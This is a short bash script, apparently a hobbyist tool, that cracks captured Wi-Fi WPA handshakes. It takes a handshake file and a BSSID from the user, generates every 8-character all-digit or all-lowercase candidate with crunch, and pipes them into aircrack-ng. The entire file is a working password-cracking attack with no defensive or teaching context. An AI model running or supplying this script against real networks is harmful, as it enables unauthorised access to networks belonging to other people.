#!/bin/bash

figlet Adam.handshak
sleep 1
echo "Choose a password type"
echo "1: number "
echo "2: Letters"
read -p "Enter password type :# " typ
read -p "Enter file handshake :# " hand
read -p "Enter Bssid :# " bssid
sleep 1
if [ $typ -eq 1 ]
then
sudo  crunch 8 8 0123456789 | sudo aircrack-ng -b $bssid $hand  -w-
elif [ $typ -eq 2 ]
then
sudo crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng -b $bssid $hand  -w-
else
echo "pleas Enter a password type..."
fi

echo "DONE...."